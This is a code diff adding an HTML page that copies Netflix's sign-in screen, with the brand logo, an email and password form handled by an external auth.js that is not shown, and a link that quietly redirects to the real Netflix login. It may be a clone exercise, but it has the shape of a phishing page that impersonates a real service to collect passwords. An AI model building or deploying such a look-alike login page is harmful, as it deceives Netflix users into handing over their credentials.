@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Sign In</title>
+    <link rel="stylesheet" href="sign-in.css">
+</head>
+<body>
+    <div class="signin-container">
+        <div class="header">
+            <img src="./public/netflix_PNG25.png" class="logo" alt="Netflix Logo">
+        </div>
+        
+        <div class="signin-form">
+            <h1>Sign In</h1>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="signin-btn">Sign In</button>
+                
+                <div class="form-help">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                    <a href="#" class="help-link">Need help?</a>
+                </div>
+            </form>
+            
+            <div class="signup-link">
+                <p>New to Netflix? <a href="#" onclick="setTimeout(() => window.location.href = 'https://www.netflix.com/tr-en/login?serverState=%7B%22realm%22%3A%22growth%22%2C%22name%22%3A%22IDENTIFICATION%22%2C%22clcsSessionId%22%3A%22c03a9278-6976-43bc-9207-a32c5c3eeeba%22%2C%22sessionContext%22%3A%7B%22session-breadcrumbs%22%3A%7B%22funnel_name%22%3A%22loginWeb%22%7D%7D%7D', 10); return false;">Sign up now</a>.</p>
+            </div>
+            
+            <div class="captcha-info">
+                <p>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <p>Questions? Call 000-800-040-1843</p>
+            <div class="footer-links">
+                <div class="col">
+                    <a href="#">FAQ</a>
+                    <a href="#">Help Center</a>
+                    <a href="#">Terms of Use</a>
+                    <a href="#">Privacy</a>
+                </div>
+            </div>
+            <div class="language-selector">
+                <select>
+                    <option>English</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <script src="auth.js"></script>
+</body>
+</html>
